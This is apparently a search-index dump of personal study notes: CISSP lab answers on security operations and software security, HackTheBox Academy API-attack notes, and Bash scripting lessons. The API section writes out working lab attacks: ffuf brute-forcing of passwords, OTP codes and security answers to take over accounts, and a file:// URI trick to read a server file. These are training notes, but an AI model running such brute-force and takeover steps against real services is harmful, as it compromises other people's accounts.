application.</p> </li> <li> <p>Dynamic testing evaluates the security of software in a runtime environment and is often the only option for organizations deploying applications written by someone else.</p> </li> </ul> </li> <li> <p>What is the difference between mutation fuzzing and generational fuzzing?</p> <ul> <li> <p>Mutation (dumb) fuzzing takes previous input values from actual operation of the software and manipulates (or mutates) it to create fuzzed input. It might alter the characters of the content, append strings to the end of the content, or perform other data manipulation techniques.</p> </li> <li> <p>Generational (intelligent) fuzzing develops data models and creates new fuzzed input based on an understanding of the types of data used by the program.</p> </li> </ul> </li> </ol>"}, {"location": "CISSP%20Pre/7-Security%20Operations/0-Overview/", "title": "Domain 7 Security Operations 13%", "text": ""}, {"location": "CISSP%20Pre/7-Security%20Operations/0-Overview/#71-understand-and-comply-with-investigations", "title": "7.1 Understand and comply with investigations", "text": "<ul> <li>Evidence collection and handling</li> <li>Reporting and documentation</li> <li>Investigative techniques</li> <li>Digital forensics tools, tactics, and procedures</li> <li>Artifacts (e.g., data, computer, network, mobile device)</li> </ul>"}, {"location": "CISSP%20Pre/7-Security%20Operations/0-Overview/#72-conduct-logging-and-monitoring-activities", "title": "7.2 Conduct logging and monitoring activities", "text": "<ul> <li>Intrusion detection and prevention system (IDPS)</li> <li>Security information and event management (SIEM)</li> <li>Security orchestration, automation and response (SOAR)</li> <li>Continuous monitoring and tuning</li> <li>Egress monitoring</li> <li>Log management</li> <li>Threat intelligence (e.g., threat feeds, threat hunting)</li> <li>User and Entity Behavior Analytics</li> </ul>"}, {"location": "CISSP%20Pre/7-Security%20Operations/0-Overview/#73-perform-configuration-management-cm-eg-provisioning-baselining-automation", "title": "7.3 Perform configuration management (CM) (e.g., provisioning, baselining, automation)", "text": ""}, {"location": "CISSP%20Pre/7-Security%20Operations/0-Overview/#74-apply-foundational-security-operations-concepts", "title": "7.4 Apply foundational security operations concepts", "text": "<ul> <li>Need-to-know/least privilege</li> <li>Segregation of Duties (SoD) and responsibilities</li> <li>Privileged account management</li> <li>Job rotation</li> <li>Service-level agreements (SLA)</li> </ul>"}, {"location": "CISSP%20Pre/7-Security%20Operations/0-Overview/#75-apply-resource-protection", "title": "7.5 Apply resource protection", "text": "<ul> <li>Media management</li> <li>Media protection techniques</li> <li>Data at rest/data in transit</li> </ul>"}, {"location": "CISSP%20Pre/7-Security%20Operations/0-Overview/#76-conduct-incident-management", "title": "7.6 Conduct incident management", "text": "<ul> <li>Detection</li> <li>Response</li> <li>Mitigation</li> <li>Reporting</li> <li>Recovery</li> <li>Remediation</li> <li>Lessons learned</li> </ul>"}, {"location": "CISSP%20Pre/7-Security%20Operations/0-Overview/#77-operate-and-maintain-detection-and-preventative-measures", "title": "7.7 Operate and maintain detection and preventative measures", "text": "<ul> <li>Firewalls (e.g., next generation, web application, network)</li> <li>Intrusion detection systems (IDS) and intrusion prevention systems (IPS)</li> <li>Whitelisting/blacklisting</li> <li>Third-party provided security services</li> <li>Sandboxing</li> <li>Honeypots/honeynets</li> <li>Anti-malware</li> <li>Machine learning and artificial intelligence (AI) based tools</li> </ul>"}, {"location": "CISSP%20Pre/7-Security%20Operations/0-Overview/#78-implement-and-support-patch-and-vulnerability-management", "title": "7.8 Implement and support patch and vulnerability management", "text": ""}, {"location": "CISSP%20Pre/7-Security%20Operations/0-Overview/#79-understand-and-participate-in-change-management-processes", "title": "7.9 Understand and participate in change management processes", "text": ""}, {"location": "CISSP%20Pre/7-Security%20Operations/0-Overview/#710-implement-recovery-strategies", "title": "7.10 Implement recovery strategies", "text": "<ul> <li>Backup storage strategies (e.g., cloud storage, onsite, offsite)</li> <li>Recovery site strategies (e.g., cold vs. hot, resource capacity agreements)</li> <li>Multiple processing sites</li> <li>System resilience, high availability (HA), Quality of Service (QoS), and fault tolerance</li> </ul>"}, {"location": "CISSP%20Pre/7-Security%20Operations/0-Overview/#711-implement-disaster-recovery-dr-processes", "title": "7.11 Implement disaster recovery (DR) processes", "text": "<ul> <li>Response</li> <li>Personnel</li> <li>Communications (e.g., methods)</li> <li>Assessment</li> <li>Restoration</li> <li>Training and awareness</li> <li>Lessons learned</li> </ul>"}, {"location": "CISSP%20Pre/7-Security%20Operations/0-Overview/#712-test-disaster-recovery-plan-drp", "title": "7.12 Test disaster recovery plan (DRP)", "text": "<ul> <li>Read-through/tabletop</li> <li>Walkthrough</li> <li>Simulation</li> <li>Parallel</li> <li>Full interruption</li> <li>Communications (e.g., stakeholders, test status, regulators)</li> </ul>"}, {"location": "CISSP%20Pre/7-Security%20Operations/0-Overview/#713-participate-in-business-continuity-bc-planning-and-exercises", "title": "7.13 Participate in Business Continuity (BC) planning and exercises", "text": ""}, {"location": "CISSP%20Pre/7-Security%20Operations/0-Overview/#714-implement-and-manage-physical-security", "title": "7.14 Implement and manage physical security", "text": "<ul> <li>Perimeter security controls</li> <li>Internal security controls</li> </ul>"}, {"location": "CISSP%20Pre/7-Security%20Operations/0-Overview/#715-address-personnel-safety-and-security-concerns", "title": "7.15 Address personnel safety and security concerns", "text": "<ul> <li>Travel</li> <li>Security training and awareness (e.g., insider threat, social media impacts, two-factor authentication (2FA) fatigue)</li> <li>Emergency management</li> <li>Duress</li> </ul>"}, {"location": "CISSP%20Pre/7-Security%20Operations/Chapter%2016/", "title": "Chapter 16 Managing Security Operations", "text": "<p>Domain 2, 3, 7 &amp; 8</p>"}, {"location": "CISSP%20Pre/7-Security%20Operations/Chapter%2016/#written-lab", "title": "Written Lab", "text": "<ol> <li> <p>Define the difference between need to know and the least privilege principle.</p> <p>Need to know focuses on permissions and the ability to access information, whereas the least privilege principle focuses on privileges. Privileges include both rights and permissions. Both limit the access of users and subjects to only what they need. Following these principles prevents and limits the scope of security incidents.</p> </li> <li> <p>Describe the purpose of monitoring the assignment and usage of special privileges.</p> <p>Monitoring the assignment of special privileges detects when individuals are granted higher privileges, such as when they are added to an administrator account. It can detect when unauthorized entities are granted higher privileges. Monitoring the usage of special privileges detects when entities are using higher privileges, such as creating unauthorized accounts, accessing or deleting logs, and creating automated tasks. This monitoring can detect potential malicious insiders and remote attackers.</p> </li> <li> <p>List the three primary cloud-based service models and identify the level of maintenance provided by the cloud service provider in each of the models.</p> <ul> <li> <p>Software as a service (SaaS)</p> </li> <li> <p>Platform as a service (PaaS)</p> </li> <li> <p>Infrastructure as a service (IaaS)</p> </li> </ul> <p>The cloud service providers provides the most maintenance and security services with SaaS, less with PaaS, and the least with IaaS.</p> </li> <li> <p>Explain how change management processes help prevent outages.</p> <p>Change management processes help prevent outages by ensuring that proposed changes are reviewed and tested before being deployed. They also ensure that changes are documented.</p> </li> </ol>"}, {"location": "CISSP%20Pre/7-Security%20Operations/Chapter%2017/", "title": "Chapter 17 Preventing and Responding to Incidents", "text": "<p>Domain 7 &amp; 8</p>"}, {"location": "CISSP%20Pre/7-Security%20Operations/Chapter%2017/#written-lab", "title": "Written Lab", "text": "<ol> <li> <p>Define an incident.</p> <p>An incident is any event that has a negative effect on the confidentiality, integrity, or availability of an organization's assets.</p> </li> <li> <p>List the different phases of incident management identified in the CISSP Security Operations domain.</p> <p>Detection, response, mitigation, reporting, recovery, remediation, and lessons learned.</p> </li> <li> <p>Describe the primary types of intrusion detection systems.</p> <ul> <li> <p>Host-based intrusion detection systems (HIDSs)</p> </li> <li> <p>Network-based intrusion detection systems (NIDSs)</p> </li> <li> <p>Knowledge-based intrusion detection systems (KIDSs) use a database of known attacks to detect intrusions.</p> </li> <li> <p>Behavior-based intrusion detection systems (BIDSs) start with a baseline of normal activity and measures network activity against the baseline to identify abnormal activity. An anomaly-based IDS is a variant of BIDS.</p> </li> </ul> </li> <li> <p>Discuss the benefits of a SIEM system.</p> <p>A SIEM system collects log entries from multiple sources in a centrailzed application. It can accept data from dissimilar devices and correlate and aggregate all of the data into useful information. It can also be configured to send alerts in real time to specific items of interest.</p> </li> <li> <p>Describe the purpose of SOAR technologies.</p> <p>SOAR stands for security orchestration, automation, and response. It refers to a group of technologies that automatically respond to some incidents. This reduces the workload on administrators.</p> </li> </ol>"}, {"location": "CISSP%20Pre/7-Security%20Operations/Chapter%2018/", "title": "Chapter 18 Disaster Recovery Planning", "text": "<p>Domain 6 &amp; 7</p>"}, {"location": "CISSP%20Pre/7-Security%20Operations/Chapter%2018/#written-lab", "title": "Written Lab", "text": "<ol> <li> <p>What are some of the main concerns businesses have when considering adopting a mutual assistance agreement?</p> <p>Businesses have three main concerns when considering adopting a mutual assistance agreement, see p.887.</p> </li> <li> <p>List and explain the five types of disaster recovery tests.</p> <p>p.899</p> <ul> <li>Read-through tests</li> <li>Structured walk-throughs</li> <li>Simulation tests</li> <li>Parallel tests</li> <li>Full-interruption tests</li> </ul> </li> <li> <p>Explain the differences between the three types of backup strategies discussed in this chapter.</p> <ul> <li>Full backups</li> <li>Incremental backups</li> <li>Differential backups</li> </ul> </li> <li> <p>Describe how cloud computing influences disaster recovery programs.</p> <p>Cloud computing influences disaster recovery programs in two major ways. First, the cloud provides excellent opportunities for disaster recovery operations, offering on-demand access to technology resources. Second, organizations using the cloud must ensure that they implement disaster recovery capabilities within their cloud environment using controls offered by the cloud service provider, built internally, or offered by third parties.</p> </li> </ol>"}, {"location": "CISSP%20Pre/7-Security%20Operations/Chapter%2019/", "title": "Chapter 19 Investigations and Ethics", "text": "<p>Domain 1 &amp; 7</p>"}, {"location": "CISSP%20Pre/7-Security%20Operations/Chapter%2019/#written-lab", "title": "Written Lab", "text": "<ol> <li> <p>What are the major categories of computer crime?</p> <p>The major categories of computer crime are military/intelligence attacks, business attacks, financial attacks, terrorist attacks, grudge attacks, and thrill attacks.</p> </li> <li> <p>What is the main motivation behind a thrill attack?</p> <p>Thrill attacks are motivated by individuals seeking to achieve the \"high\" associated with successfully breaking into a computer system.</p> </li> <li> <p>What is the difference between an interview and an interrogation?</p> <p>Interviews are conducted with the intention of gathering information from individuals to assist with your investigation. Interrogations are conducted with the intent of gathering evidence from suspects to be used in a criminal prosecution.</p> </li> <li> <p>What are the three basic requirements that evidence must meet in order to be admissible in court?</p> <p>To be admissible, evidence must be reliable, competent, and material to the case.</p> </li> </ol>"}, {"location": "CISSP%20Pre/8-Software%20Development%20Security/0-Overview/", "title": "Domain 8 Software Development Security 10%", "text": ""}, {"location": "CISSP%20Pre/8-Software%20Development%20Security/0-Overview/#81-understand-and-integrate-security-in-the-software-development-life-cycle-sdlc", "title": "8.1 Understand and integrate security in the Software Development Life Cycle (SDLC)", "text": "<ul> <li>Development methodologies (e.g., Agile, Waterfall, DevOps, DevSecOps, Scaled Agile Framework)</li> <li>Maturity models (e.g., Capability Maturity Model (CMM), Software Assurance Maturity Model (SAMM))</li> <li>Operation and maintenance</li> <li>Change management</li> <li>Integrated Product Team</li> </ul>"}, {"location": "CISSP%20Pre/8-Software%20Development%20Security/0-Overview/#82-identify-and-apply-security-controls-in-software-development-ecosystems", "title": "8.2 Identify and apply security controls in software development ecosystems", "text": "<ul> <li>Programming languages</li> <li>Libraries</li> <li>Tool sets</li> <li>Integrated Development Environment</li> <li>Runtime</li> <li>Continuous Integration and Continuous Delivery (CI/CD)</li> <li>Software Configuration Management</li> <li>Code repositories</li> <li>Application security testing (e.g., static application security testing (SAST), dynamic application security testing (DAST), software composition analysis, Interactive Application Security Test (IAST))</li> </ul>"}, {"location": "CISSP%20Pre/8-Software%20Development%20Security/0-Overview/#83-assess-the-effectiveness-of-software-security", "title": "8.3 Assess the effectiveness of software security", "text": "<ul> <li>Auditing and logging of changes</li> <li>Risk analysis and mitigation</li> </ul>"}, {"location": "CISSP%20Pre/8-Software%20Development%20Security/0-Overview/#84-assess-security-impact-of-acquired-software", "title": "8.4 Assess security impact of acquired software", "text": "<ul> <li>Commercial off-the-shelf (COTS)</li> <li>Open source</li> <li>Third-party</li> <li>Managed services (e.g., enterprise applications)</li> <li>Cloud services (e.g., Software as a Service (SaaS), Infrastructure as a Service (IaaS), Platform as a Service (PaaS))</li> </ul>"}, {"location": "CISSP%20Pre/8-Software%20Development%20Security/0-Overview/#85-define-and-apply-secure-coding-guidelines-and-standards", "title": "8.5 Define and apply secure coding guidelines and standards", "text": "<ul> <li>Security weaknesses and vulnerabilities at the source-code level</li> <li>Security of application programming interfaces (API)</li> <li>Secure coding practices</li> <li>Software-defined security</li> </ul>"}, {"location": "CISSP%20Pre/8-Software%20Development%20Security/Chapter%2020/", "title": "Chapter 20 Software Development Security", "text": "<p>Domain 3 &amp; 8</p>"}, {"location": "CISSP%20Pre/8-Software%20Development%20Security/Chapter%2020/#written-lab", "title": "Written Lab", "text": "<ol> <li> <p>What is the main purpose of a primary key in a database table?</p> <p>The primary key uniquely identifies each row in the table.</p> </li> <li> <p>What is polyinstantiation?</p> <p>Polyinstantiation is a database security technique that appears to permit the insertion of multiple rows sharing the same uniquely identifying information.</p> </li> <li> <p>Explain the difference between static and dynamic analysis of application code.</p> <p>Static analysis performs assessment of the code itself, analyzing the sequence of instructions for security flaws.</p> <p>Dynamic analysis tests the code in a live production environment, searching for runtime flaws.</p> </li> <li> <p>Why should both static and dynamic analysis of application code be used together whenever possible?</p> <p>Static and dynamic analysis each have the potential to uncover different types of security and design flaws. when the testers have access to the application code, they should conduct both static and dynamic testing. Reading code is a lot different from executing it.</p> </li> <li> <p>Explain the difference between supervised and unsupervised machine learning.</p> <p>p.985</p> </li> </ol>"}, {"location": "CISSP%20Pre/8-Software%20Development%20Security/Chapter%2021/", "title": "Chapter 21 Malicious Code and Application Attacks", "text": "<p>Domain 3, 7 &amp; 8</p>"}, {"location": "CISSP%20Pre/8-Software%20Development%20Security/Chapter%2021/#written-lab", "title": "Written Lab", "text": "<ol> <li> <p>What is the major difference between a virus and a worm?</p> <p>Viruses require human intervention, such as sharing a file, network resource, or email message, to propagate. On the other hand, worms seek out vulnerabilities and spread from system to system under their own power, thereby greatly magnifying their reproductive capability, especially in a well-connected network.</p> </li> <li> <p>What are the actions an antivirus software package might take when it discovers an infected file?</p> <p>If possible, antivirus software may try to disinfect an infected file, removing the virus's malicious code. If that fails, it might either quarantine the file for manual review or automatically delete it to prevent further infection.</p> </li> <li> <p>Explain how a data integrity assurance package like Tripwire provides secondary virus detection capabilities.</p> <p>Data integrity assurance packages like Tripwire compute hash values for each file stored on a protected system. If a file infector virus strikes the system, this would result in a change in the affected file's hash value and would therefore trigger a file integrity alert.</p> </li> <li> <p>What controls may be used to protect against SQL injection vulnerabilities?</p> <p>Defending against SQL injection vulnerabilities requires a defense-in-depth approach. It may include the use of whitelisting and/or blacklisting input validation, stored procedures/parameterized queries, web application security scans, web application firewalls, and other controls.</p> </li> </ol>"}, {"location": "HTB/Academy/API%20attack/", "title": "API attack", "text": "<ul> <li>Broken object level authorization</li> <li>Broken authentication</li> <li>Broken object property level authorization</li> <li>Unrestricted resource consumption</li> <li>Broken function level authorization</li> <li>Unrestricted access to sensitive business flows</li> <li>Server side request forgery</li> <li>Security misconfiguration</li> <li>improper inventory management</li> <li>Unsafe consumption of APIs</li> </ul>"}, {"location": "HTB/Academy/API%20attack/#api-building-styles", "title": "API building styles", "text": "<ul> <li> <p>Representational State Transfer (REST) is the most popular API style. It uses a client-server model where clients make requests to resources on a server using standard HTTP methods (GET, POST, PUT, DELETE). RESTful APIs are stateless, meaning each request contains all necessary information for the server to process it, and responses are typically serialized as JSON or XML.</p> </li> <li> <p>Simple Object Access Protocol (SOAP) uses XML for message exchange between systems. SOAP APIs are highly standardized and offer comprehensive features for security, transactions, and error handling, but they are generally more complex to implement and use than RESTful APIs.</p> </li> <li> <p>GraphQL is an alternative style that provides a more flexible and efficient way to fetch and update data. Instead of returning a fixed set of fields for each resource, GraphQL allows clients to specify exactly what data they need, reducing over-fetching and under-fetching of data. GraphQL APIs use a single endpoint and a strongly-typed query language to retrieve data.</p> </li> <li> <p>gRPC is a newer style that uses Protocol Buffers for message serialization, providing a high-performance, efficient way to communicate between systems. gRPC APIs can be developed in a variety of programming languages and are particularly useful for microservices and distributed systems.</p> </li> </ul> <p>OWASP API Security Top 10 | 2023</p> <pre><code>$ for ((i=1;i&lt;=20;i++)); do \ncurl -s -X 'GET' \\\n  'http://83.136.252.242:46669/api/v1/suppliers/quarterly-reports/'$i'' \\\n  -H 'accept: application/json' \\\n  -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTcyMTM2Njc5MiwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.T2mSaN20mSaYJnc2cBZE5gMELL5819OzdKkzWmUBqAD7gW-cBi1EhYkvgPBDNpRlpseLMQh-6q5zHq7mAaagcQ' | jq\ndone\n</code></pre>"}, {"location": "HTB/Academy/API%20attack/#bruteforce-password-with-ffuf", "title": "Bruteforce password with ffuf", "text": "<pre><code># extract email addresses from a file\n$  grep -i -o '[A-Z0-9._%+-]\\+@[A-Z0-9.-]\\+\\.[A-Z]\\{2,4\\}' file.txt &gt; emails.txt\n\n$ ffuf -w /opt/useful/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASS -w customerEmails.txt:EMAIL -u http://94.237.59.63:31874/api/v1/authentication/customers/sign-in -X POST -H \"Content-Type: application/json\" -d '{\"Email\": \"EMAIL\", \"Password\": \"PASS\"}' -fr \"Invalid Credentials\" -t 100\n</code></pre> <pre><code># POST method doesn't support! Fuzzing password when an API endpoint only support GET method\n$ wfuzz -z list,Billy-Jack-Lucy-Roger-administrator -z file,/usr/share/wordlists/seclists/Passwords/2020-200_most_used_passwords.txt --basic FUZZ:FUZ2Z http://git.offseclab.io/api/v1/user &gt; output.txt\n\n# Wfuzz can set an authentication headers by using the \u2013basic/ntlm/digest command line switches.\n</code></pre>"}, {"location": "HTB/Academy/API%20attack/#broken-authentication", "title": "Broken Authentication", "text": "<p>Quiz solution:</p> <p>OTP is one-time password. User use <code>/api/v1/authentication/customers/passwords/resets/email-otps</code> to request a password reset action, the server will send an one-time token to the user's email. Then, use the following ffuf command to bruteforce the one-time token that has been sent to the email. After you find the OTP token. Use <code>/api/v1/authentication/customers/passwords/resets</code> to reset a new password for the customer, then you get full access of this customer's account.</p> <p><code>-fr</code>: filter the value meets the regular expression</p> <p><code>-mr</code>: Find the value meets the regular expression</p> <pre><code>$ seq -w 0 9999 &gt; tokens.txt\n\n# bruteforce the OTP token\n$ ffuf -w tokens.txt:TOKEN -u http://94.237.59.199:34941/api/v1/authentication/customers/passwords/resets -X POST -H \"Content-Type: application/json\" -d '{\"Email\": \"MasonJenkins@ymail.com\", \"OTP\": \"TOKEN\", \"NewPassword\": \"qwerasdfzxcv123\"}'  -fr \"false\"\n\n# request body of /api/v1/authentication/customers/passwords/resets\n{\n  \"Email\": \"MasonJenkins@ymail.com\",\n  \"OTP\": \"2221\",\n  \"NewPassword\": \"qwerasdfzxcv123\"\n}\n</code></pre> <pre><code># use dd to create a file containing 30 random megabytes and assign it the .pdf extension\n# if: input file; of: output file\n$ dd if=/dev/urandom of=certificateOfIncorporation.pdf bs=1M count=30\n</code></pre> <p>HTTP Security Response Headers Cheat Sheet</p>"}, {"location": "HTB/Academy/API%20attack/#skill-assessment", "title": "Skill assessment", "text": "<ol> <li> <p>use the provided credential to login.</p> </li> <li> <p>the user can access <code>/api/v2/suppliers</code> to get all suppliers and some suppliers have security question: what is your favoriate color? Extract the email addresses of these suppliers and store the email addresses into a file.</p> </li> <li> <p>use <code>/api/v2/authentication/suppliers/passwords/resets/security-question-answers</code> endpoint to reset the password of the suppliers</p> </li> </ol> <p>Use this wordlist colors.txt|GitHub for colours.txt</p> <pre><code>$ ffuf -w supplieremailsOutput.txt:EMAIL -w colours.txt:COLOUR -u http://94.237.59.63:36181/api/v2/authentication/suppliers/passwords/resets/security-question-answers -X POST -H \"Content-Type: application/json\" -d '{\"SupplierEmail\": \"EMAIL\", \"SecurityQuestionAnswer\": \"COLOUR\", \"NewPassword\": \"qwerasdfzxcv123\"}'  -fr \"false\"\n\n[Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 298ms]\n    * COLOUR: rust\n    * EMAIL: B.Rogers1535@globalsolutions.com\n\n:: Progress: [375/375] :: Job [1/1] :: 142 req/sec :: Duration: [0:00:03] :: Errors: 0 ::\n</code></pre> <ol> <li> <p>use <code>B.Rogers1535@globalsolutions.com:qwerasdfzxcv123</code> to login as a supplier</p> </li> <li> <p><code>/api/v2/suppliers/current-user/cv</code> : upload the supplier's CV</p> </li> </ol> <pre><code># Response body\n{\n  \"successStatus\": true,\n  \"fileURI\": \"file:///app/wwwroot/SupplierCVs/cv.pdf\",\n  \"fileSize\": 6\n}\n</code></pre> <ol> <li><code>/api/v2/suppliers/current-user</code> update <code>ProfessionalCVPDFFileURI</code></li> </ol> <pre><code># Request body\n{\n  \"SecurityQuestion\": \"What is your favorite color?\",\n  \"SecurityQuestionAnswer\": \"black\",\n  \"ProfessionalCVPDFFileURI\": \"file:///flag.txt\",\n  \"PhoneNumber\": \"123456\",\n  \"Password\": \"qwerasdfzxcv123\"\n}\n\n# Response body\n{\n  \"SuccessStatus\": true\n}\n</code></pre> <ol> <li><code>/api/v2/suppliers/current-user/cv</code> get current supplier's CV</li> </ol> <pre><code># Response body\n{\n  \"successStatus\": true,\n  \"base64Data\": \"SFRCe2YxOTBiODBjZDU0M2E4NGIyMzZlOTJhMDdhOWQ4ZDU5fQo=\"\n}\n\n$ echo \"SFRCe2YxOTBiODBjZDU0M2E4NGIyMzZlOTJhMDdhOWQ4ZDU5fQo=\" | base64 -d\nHTB{f190b80cd543a84b236e92a07a9d8d59}\n</code></pre>"}, {"location": "HTB/Academy/Introduction%20to%20Bash%20Scripting/", "title": "Introduction to Bash Scripting", "text": ""}, {"location": "HTB/Academy/Introduction%20to%20Bash%20Scripting/#bourne-again-shell", "title": "Bourne Again Shell", "text": "<pre><code>$ bash script.sh &lt;optional arguments&gt;\n$ sh script.sh &lt;optional arguments&gt;\n$ ./script.sh &lt;optional arguments&gt;\n</code></pre> <p>CIDR.sh</p> <p><code>$ ./CIDR.sh inlanefreight.com</code></p> <pre><code>#!/bin/bash\n\n# Check for given arguments\nif [ $# -eq 0 ]\nthen\n    echo -e \"You need to specify the target domain.\\n\"\n    echo -e \"Usage:\"\n    echo -e \"\\t$0 &lt;domain&gt;\"\n    exit 1\nelse\n    domain=$1\nfi\n\n# Identify Network range for the specified IP address(es)\nfunction network_range {\n    for ip in $ipaddr\n    do\n        netrange=$(whois $ip | grep \"NetRange\\|CIDR\" | tee -a CIDR.txt)\n        cidr=$(whois $ip | grep \"CIDR\" | awk '{print $2}')\n        cidr_ips=$(prips $cidr)\n        echo -e \"\\nNetRange for $ip:\"\n        echo -e \"$netrange\"\n    done\n}\n\n# Ping discovered IP address(es)\nfunction ping_host {\n    hosts_up=0\n    hosts_total=0\n\n    echo -e \"\\nPinging host(s):\"\n    for host in $cidr_ips\n    do\n        stat=1\n        while [ $stat -eq 1 ]\n        do\n            ping -c 2 $host &gt; /dev/null 2&gt;&amp;1\n            if [ $? -eq 0 ]\n            then\n                echo \"$host is up.\"\n                ((stat--))\n                ((hosts_up++))\n                ((hosts_total++))\n            else\n                echo \"$host is down.\"\n                ((stat--))\n                ((hosts_total++))\n            fi\n        done\n    done\n\n    echo -e \"\\n$hosts_up out of $hosts_total hosts are up.\"\n}\n\n# Identify IP address of the specified domain\nhosts=$(host $domain | grep \"has address\" | cut -d\" \" -f4 | tee discovered_hosts.txt)\n\necho -e \"Discovered IP address:\\n$hosts\\n\"\nipaddr=$(host $domain | grep \"has address\" | cut -d\" \" -f4 | tr \"\\n\" \" \")\n\n# Available options\necho -e \"Additional options available:\"\necho -e \"\\t1) Identify the corresponding network range of target domain.\"\necho -e \"\\t2) Ping discovered hosts.\"\necho -e \"\\t3) All checks.\"\necho -e \"\\t*) Exit.\\n\"\n\nread -p \"Select your option: \" opt\n\ncase $opt in\n    \"1\") network_range ;;\n    \"2\") ping_host ;;\n    \"3\") network_range &amp;&amp; ping_host ;;\n    \"*\") exit 0 ;;\nesac\n</code></pre>"}, {"location": "HTB/Academy/Introduction%20to%20Bash%20Scripting/#conditional-execution", "title": "Conditional Execution", "text": "<p>Script.sh</p> <pre><code>#!/bin/bash\n\n# Check for given argument\nif [ $# -eq 0 ]\nthen\n    echo -e \"You need to specify the target domain.\\n\"\n    echo -e \"Usage:\"\n    echo -e \"\\t$0 &lt;domain&gt;\"\n    exit 1\nelse\n    domain=$1\nfi\n</code></pre> <pre><code>#!/bin/bash - Shebang.\nif-else-fi - Conditional execution.\necho - Prints specific output.\n$# / $0 / $1 - Special variables.\ndomain - Variables.\n</code></pre> <p>If-Only.sh</p> <p>```sh  #!/bin/bash</p> <p>value=$1</p> <p>if [ $value -gt \"10\" ] then         echo \"Given argument is greater than 10.\" fi</p> <pre><code>\n**If-Elif-Else.sh**\n\n```sh\n#!/bin/bash\n\nvalue=$1\n\nif [ $value -gt \"10\" ]\nthen\n    echo \"Given argument is greater than 10.\"\nelif [ $value -lt \"10\" ]\nthen\n    echo \"Given argument is less than 10.\"\nelse\n    echo \"Given argument is not a number.\"\nfi\n</code></pre> <p>Several conditions Script.sh</p> <pre><code>#!/bin/bash\n\n# Check for given argument\nif [ $# -eq 0 ]\nthen\n    echo -e \"You need to specify the target domain.\\n\"\n    echo -e \"Usage:\"\n    echo -e \"\\t$0 &lt;domain&gt;\"\n    exit 1\nelif [ $# -eq 1 ]\nthen\n    domain=$1\nelse\n    echo -e \"Too many arguments given.\"\n    exit 1\nfi\n</code></pre> <p>Exercise script</p> <pre><code>#!/bin/bash\n# Count number of characters in a variable:\n#     echo $variable | wc -c\n\n# Variable to encode\nvar=\"nef892na9s1p9asn2aJs71nIsm\"\n\nfor counter in {1..40}\ndo\n    var=$(echo $var | base64)\n\n    if [ $counter -eq \"35\" ]\n    then \n        echo $var | wc -c\n    fi\ndone\n</code></pre> <p><code>bash ./script.sh</code></p> <p>Note: above code is not supported by <code>sh</code>, cannot be executed by <code>sh ./script.sh</code></p> <pre><code>#!/bin/bash\n# Count number of characters in a variable:\n#     echo $variable | wc -c\n\n# Variable to encode\nvar=\"nef892na9s1p9asn2aJs71nIsm\"\n\ncounter=0\nwhile [ $counter -le 40 ]\ndo\n    var=$(echo $var | base64)\n\n    counter=$((counter + 1))\n\n    if [ $counter -eq 35 ]; then\n         echo \"Character count at iteration 35: $(echo $var | wc -c)\"\n     fi\ndone\n</code></pre>"}, {"location": "HTB/Academy/Introduction%20to%20Bash%20Scripting/#arguments-variables-and-arrays", "title": "Arguments, Variables, and Arrays", "text": "<p><code>$ chmod +x cidr.sh</code></p> <p>Special Variables</p> <p>Internal Field Separator (IFS)</p> IFS Description $# This variable holds the number of arguments passed to the script. (the script's name doesn't count) $@ This variable can be used to retrieve the list of command-line arguments. $n Each command-line argument can be selectively retrieved using its position. For example, the first argument is found at $1. $$ The process ID of the currently executing process. $? The exit status of the script. This variable is useful to determine a command's success. The value 0 represents successful execution, while 1 is a result of a failure. <p>Arrays.sh</p> <pre><code>#!/bin/bash\n\ndomains=(www.inlanefreight.com ftp.inlanefreight.com vpn.inlanefreight.com www2.inlanefreight.com)\n\necho ${domains[0]}\n</code></pre> <pre><code>#!/bin/bash\n\ndomains=(\"www.inlanefreight.com ftp.inlanefreight.com vpn.inlanefreight.com\" www2.inlanefreight.com)\necho ${domains[0]}\n</code></pre>"}, {"location": "HTB/Academy/Introduction%20to%20Bash%20Scripting/#comparison-operators", "title": "Comparison Operators", "text": "<p>String Operators</p> Operator Description == is equal to != is not equal to &lt; is less than in ASCII alphabetical order &gt; is greater than in ASCII alphabetical order -z if the string is empty (null) -n if the string is not null <p>It is important to note here that we put the variable for the given argument (<code>$1</code>) in double-quotes (<code>\"$1\"</code>). This tells Bash that the content of the variable should be handled as a string. Otherwise, we would get an error.</p> <pre><code>#!/bin/bash\n\n# Check the given argument\nif [ \"$1\" != \"HackTheBox\" ]\nthen\n    echo -e \"You need to give 'HackTheBox' as argument.\"\n    exit 1\n\nelif [ $# -gt 1 ]\nthen\n    echo -e \"Too many arguments given.\"\n    exit 1\n\nelse\n    domain=$1\n    echo -e \"Success!\"\nfi\n</code></pre> <p>String comparison operators \"<code>&lt; / &gt;</code>\" works only within the double square brackets <code>[[ &lt;condition&gt; ]]</code>. We can find the ASCII table on the Internet or by using the following command in the terminal. We take a look at an example later.</p> <p><code>$ man ascii</code></p> <p>Integer Operators</p> Operator Description -eq is equal to = -ne is not equal to != -lt is less than &lt; -le is less than or equal to &lt;= -gt is greater than &gt; -ge is greater than or equal to &gt;= <pre><code>#!/bin/bash\n\n# Check the given argument\nif [ $# -lt 1 ]\nthen\n    echo -e \"Number of given arguments is less than 1\"\n    exit 1\n\nelif [ $# -gt 1 ]\nthen\n    echo -e \"Number of given arguments is greater than 1\"\n    exit 1\n\nelse\n    domain=$1\n    echo -e \"Number of given arguments equals 1\"\nfi\n</code></pre> <p>File Operators</p> Operator Description -e if the file exist -f tests if it is a file -d tests if it is a directory -L tests if it is if a symbolic link -N checks if the file was modified after it was last read -O if the current user owns the file -G if the file\u2019s group id matches 